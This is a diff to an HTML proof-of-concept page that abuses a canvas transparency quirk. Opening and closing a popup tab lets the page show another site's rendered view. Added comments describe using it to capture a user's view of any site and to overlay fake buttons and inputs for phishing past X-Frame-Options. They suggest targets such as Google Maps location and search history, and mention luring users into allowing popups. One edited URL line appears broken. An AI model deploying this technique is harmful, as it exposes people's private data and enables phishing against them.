@@ -20,20 +20,25 @@
             margin: 0;
 
         }
-        span{
-            position:absolute;
-            left:1%;
-            top:1%;
+
+        span {
+            position: absolute;
+            left: 1%;
+            top: 1%;
         }
+
         canvas {
             z-index: 1;
-            display:none;
+            display: none;
         }
     </style>
     <canvas></canvas>
-    <span>Allow popups and refresh to automatically grab Google<br><br>Instructions:<br>1. Leave this site open in a tab<br>2. Go to another tab with any website on it<br>3. Come back to this tab<br>If it doesn't work, start again<br>This doesn't work on iPhones or Firefox</span>
+    <span>Allow popups and refresh to automatically grab Google<br><br>Instructions:<br>1. Leave this site open in a
+        tab<br>2. Go to another tab with any website on it<br>3. Come back to this tab<br>If it doesn't work, start
+        again<br>This doesn't work on iPhones or Firefox<br>Annotations in the code</span>
     <script>
         var canvas = document.querySelector('canvas')
+        //MUST have alpha set to false for whatever reason
         ctx = canvas.getContext('2d', { alpha: false })
         canvas.width = document.body.clientWidth
         canvas.height = document.body.clientHeight
@@ -43,30 +48,37 @@
             if (document.visibilityState !== 'visible') {
                 if (!drawing) {
                     setInterval(function () {
-                        //must clearrect a canvas with alpha set to false in the getContext at a high rate (this is 60fps)
-                        //the website isn't drawn to the canvas, but the current tab is made transparent so that the previous page is shown.
-                        //by quickly opening and closing a tab, I can choose the previous page shown. 
+                        //Must clearrect a canvas with alpha set to false in the getContext at a high rate (this is 60fps)
+                        //The website isn't drawn to the canvas, but the current tab is made transparent so that the previous page is shown.
+                        //The canvas's content is still visible, though. The background isn't but things drawn to it are.
+                        //By quickly opening and closing a tab, I can choose the previous page and essentially grab a user's view of any website.
+                        //Note that most browsers block popups automatically but it's still possible to lure someone into enabling popups 
+                        //It also is able to view inspect element if it was opened on the previous or current page. Try opening inspect element and fiddling with the width.
                         ctx.clearRect(0, 0, canvas.width, canvas.height)
-                        var str = "This isn't able to read the webpage but can be used for phishing attacks by placing buttons on top of areas where buttons are known to be. IFrames can do something similar, but this bypasses the X-Frames-Options header."
-                        ctx.fillRect(0,0,ctx.measureText(str).width+6,21)
+                        var str = "This isn't able to read the webpage but can be used for phishing attacks by placing buttons and text inputs on top of areas where buttons are known to be. IFrames can do something similar, but this bypasses the X-Frames-Options header."
+                        ctx.fillRect(0, 0, ctx.measureText(str).width + 6, 21)
                         ctx.fillStyle = '#000'
-                        ctx.fillText(str,3,18)
+                        ctx.fillText(str, 3, 18)
                         ctx.fillStyle = '#fff'
                     }, 1000 / 60)
                     canvas.style.display = 'inline-block'
-                    
+
                     drawing = true
                 }
             }
         })
         //temporarily open tab
-        var w = window.open('http://google.com')
-        setTimeout(function(){
-            if(w!=null){
-                w.close()
-            }
+        //ex. targets would be 
+        /* 
+            https://google.com/maps which after about 1500ms puts a dot at your exact location (better than IP geolocation)
+            https://myactivity.google.com/product/search?hl=en&max=Date.now()*1000 which loads your search history in about 300ms
+            web dashboards
+        */
+        var w = window.open('https://google.com'+Date.now()*1000)
+        setTimeout(function () {
+            w.close()
             //doesn't work for certain websites, but the window.open still opens and the content is still mirrored
-        },100)
+        }, 150)
     </script>
 </body>
 
